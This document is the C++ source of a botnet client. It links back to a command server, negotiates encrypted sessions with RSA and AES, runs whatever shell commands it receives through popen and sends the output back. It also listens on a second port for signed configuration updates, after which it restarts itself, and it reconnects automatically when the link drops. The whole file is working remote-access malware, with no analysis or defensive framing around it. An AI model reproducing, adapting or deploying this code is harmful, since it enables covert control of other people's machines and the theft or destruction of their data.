#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#include <sys/dir.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <cryptopp/rsa.h>
#include <cryptopp/sha.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/pssr.h>

#include "base64.h"

using std::string;
using namespace CryptoPP;

const int max = 100000;
const char *serverIp = "127.0.0.1";
const char *serverPublicKey =
        "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA6dc8DeNA4iuOnASTRdcr"
        "jYpokUgc65NIJ9uMem2gfxYK5v9ZP7JDlL2My4zLN9fyhPcQOnDNdKrkkqLC/Cv1"
        "eEJB9YF677zIh8SL2d4goOWEuLs70iQdNKLQM3Pyw9d6f8GJ3dAUz6fRo/5k9Uhb"
        "fFegUBf3HJXSQ3FfxJcwchsrg+858aVFeLvrjqAPLgSHT6NnfI0P7F1kFFymsQTK"
        "FGpd2BXj+efptiEfBRfRzr/vXsZJ3c36rI3qaQQs0qBRgrew+S8li2565D1bfMvY"
        "JLOuTH55YNNyCzgGR1NinyDdZp/dPJ0EcpKPbH5Mcer+k7JA0dNHTKt/GLxzU+bm"
        "bwkmOE3SsGvdkvB4CP1HoolIOmBvnQOPekH3cwrIuMLXR9KWQZj+8CYuWts7+NIC"
        "1gdgocAoYEaF5J3J+1Lqt5+jbsgM4Hm1m7c8FbCjIVc9NAKWZbEK0uuXqvMj/VDJ"
        "abJzIi3GGu3irreHFqIcTbpW9twCFii8wqIJ+W2TEpBEhWyD6+3LIWsuYzMmbC5V"
        "KjoqHHGcQr6MFDcwgZK0OszM8vjw+Il66soH2JS6z8d5kT1AIg8xrAX+QoFh3hpJ"
        "aSQqPnX3bRxrZKhcFdonifghV5lgRJ5PYjYMvEpVH01+jvUAdiha09ooe0j+gYWl"
        "Qgj1wnN7XqBqhg3/PrzOXk0CAwEAAQ==";

const char *TooSlow = "OProcess was too slow and had been killed";

RSA::PublicKey *serverPub;

RSAES_OAEP_SHA_Encryptor *encryptor;

CFB_Mode<AES>::Encryption *cfbEncryption;
CFB_Mode<AES>::Decryption *cfbDecryption;

AutoSeededRandomPool rng;
FILE *processOutput;

char *buf;

int currentVersion = 0;
int mainSocket;
int PID;
int mainProcessPID;

void recvDecrypted();
void recvTimeout(int);
void scanBuf();
void clearBuf();
string encryptRSA(string text);
void initRSA();
void initNET();
void initAES();
void initSignals();
void sendEncrypted(const byte *message, int len);
void sendEncrypted(const char *message, int len);
void* startCommand(void *);

void clearBuf() {
    for (int i = 0; i <= max; i++)
        buf[i] = 0;
}

void onExit() {
    kill(PID, SIGKILL);
}

void restart(int signal) {
    execlp("/proc/self/exe", NULL);
}

string encryptRSA(string text) {
    string res;
    StringSource(text, true,
        new PK_EncryptorFilter(rng, *encryptor,
            new StringSink(res)));

    return res;
}

void initRSA() {
    string pubkey = base64_decode(string(serverPublicKey));
    ByteQueue tmp;
    for (int i = 0; i < pubkey.size(); i++)
        tmp.Put((byte)pubkey[i]);

    serverPub = new RSA::PublicKey;
    serverPub->Load(tmp);

    encryptor = new RSAES_OAEP_SHA_Encryptor(*serverPub);
}

void initNET() {
    mainSocket = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr addr;
    addr.sa_family = AF_INET;
    *((unsigned short*)&addr + 1) = htons(24953);
    *((int*)&addr + 1) = htonl(inet_network(serverIp));

    printf("Searching command server...\n");
    while (connect(mainSocket, &addr, sizeof(addr)))
        usleep(2000000);
}

void initAES() {
    SecByteBlock key(0x00, AES::DEFAULT_KEYLENGTH);
    rng.GenerateBlock(key, key.size());

    byte initVector[AES::BLOCKSIZE];
    rng.GenerateBlock(initVector, AES::BLOCKSIZE);

    printf("sending aes... ");

    string aesInform;
    for (int i = 0; i < AES::DEFAULT_KEYLENGTH; i++)
        aesInform.push_back(*(key.BytePtr() + i));

    for (int i = 0; i < AES::BLOCKSIZE; i++)
        aesInform.push_back(initVector[i]);

    aesInform = encryptRSA(aesInform);
    aesInform = base64_encode((unsigned char*)(aesInform.c_str()), aesInform.size());

    send(mainSocket, aesInform.c_str(), aesInform.size(), 0);

    printf("sended\n");

    cfbEncryption = new CFB_Mode<AES>::Encryption(key, key.size(), initVector);
    cfbDecryption = new CFB_Mode<AES>::Decryption(key, key.size(), initVector);

    recvDecrypted();
    if (strncmp("vtyulb", buf, 6) == 0)
        printf("server authorized\n");
    else {
        printf("false server??\n");
        initNET();
        initAES();
        return;
    }
}

void scanBuf() {
    alarm(30);
    if (recv(mainSocket, buf, 1, 0) == 0) {
        alarm(0);
        initNET();
        initAES();
        recvDecrypted();
        return;
    }
    alarm(0);

    int cur = 0;
    while (buf[cur] != '\n')
        recv(mainSocket, buf + ++cur, 1, 0);

    buf[cur] = 0;

    printf("Got: %s\n", buf);
    fflush(stdout);
}

void recvDecrypted() {
    scanBuf();
    string half = base64_decode(string((char*)buf));
    cfbDecryption->ProcessData((byte*)buf, (byte*)half.c_str(), half.size());
    buf[half.size()] = 0;
}

void sendEncrypted(const byte *message, int len) {
    byte buf[len];
    cfbEncryption->ProcessData(buf, message, len);
    string s = base64_encode(buf, len);
    s.push_back('\n');
    send(mainSocket, s.c_str(), s.length(), 0);
}

void sendEncrypted(const char *message, int len) {
    sendEncrypted((const byte*)message, len);
}

void initMEM() {
    buf = (char *)malloc(max + 2) + 1;
    mainProcessPID = getpid();
}

void initSignals() {
    signal(SIGALRM, recvTimeout);
    signal(SIGUSR1, restart);
    atexit(onExit);
}

void* startCommand(void *) {
    processOutput = popen(buf, "r");
    int current = 0;
    buf[-1] = 'O';
    while (fgets(buf + current, max - current - 2, processOutput) != NULL && current != max - 2)
        current += strlen(buf + current);

    buf[current] = 0;
    processOutput = NULL;
}

void recvTimeout(int signal) {
    initNET();
    initAES();
}

void serveSocket(int socket) {
    mainSocket = socket;
    printf("connection established with id: %d\n", socket);
    scanBuf();
    if (strncmp(buf, "ask", 3) == 0) {

    } else if (strncmp(buf, "set", 3) == 0) {
        scanBuf();
        string messageEncoded = std::string((char*)buf);
        string message = base64_decode(messageEncoded);
        scanBuf();
        string signEncoded = std::string((char*)buf);
        string sign = base64_decode(signEncoded);

        RSASS<PSSR, SHA1>::Verifier verifier(*serverPub);
        bool good = verifier.VerifyMessage((unsigned char*)message.c_str(), message.size(), (unsigned char*)sign.c_str(), sign.size());
        int version = htonl(*(int*)message.c_str());
        if (good && version > currentVersion) {
            FILE *fout = fopen("botconfig.ini", "w");
            fprintf(fout, "set\n%s\n", messageEncoded.c_str());
            fprintf(fout, "%s\n", signEncoded.c_str());
            fclose(fout);
            kill(mainProcessPID, SIGUSR1);
            _exit(0);
        }

    }
    fflush(stdout);
    close(socket);
    printf("finishing fork()\n");
}

void IAMWHITE() {
    PID = fork();
    if (PID == 0) {
        mainSocket = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in ServerAddr;
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(50947);
        ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
        printf("binding... %d\n", bind(mainSocket, (sockaddr*)&ServerAddr, sizeof(ServerAddr)));
        printf("listening: %d\n", listen(mainSocket, 100));
        fflush(stdout);

        while (1) {
            int socket = accept(mainSocket, NULL, NULL);
            if (fork() == 0) {
                serveSocket(socket);
                _exit(0);
            }
        }
    }
}

int main() {
    initSignals();
    initMEM();
    initRSA();
    IAMWHITE();
    initNET();
    initAES();

    while (true) {
        clearBuf();

        recvDecrypted();

        if (strncmp(buf, "cd ", 3) == 0) {
            chdir(buf + 3);
            getcwd(buf, max);
            buf[-1] = 'D';
            sendEncrypted(buf - 1, strlen(buf) + 1);
        } else if (strncmp(buf, "ping", 4) == 0) {
            sendEncrypted("P", 1);
        } else if (strncmp("DUMP WHITELIST", buf, 14) == 0) {
        } else {
            processOutput = (FILE*)buf;
            pthread_t thread;

            pthread_create(&thread, NULL, startCommand, NULL);
            for (int i = 0; i < 100 && processOutput; i++)
                usleep(100000);
            printf("Killing childs\n");
            fflush(stdout);
            if (processOutput) {
                printf("force stop\n");
                fflush(stdout);
                pthread_cancel(thread);
                sendEncrypted(buf - 1, strlen(buf) + 1);
                sendEncrypted(TooSlow, strlen(TooSlow));
                sendEncrypted("E", 1);
                continue;
            }

            printf("server have: %s", buf - 1);
            sendEncrypted(buf - 1, strlen(buf) + 1);
            sendEncrypted("E", 1);
        }
    }

    return 0;
}
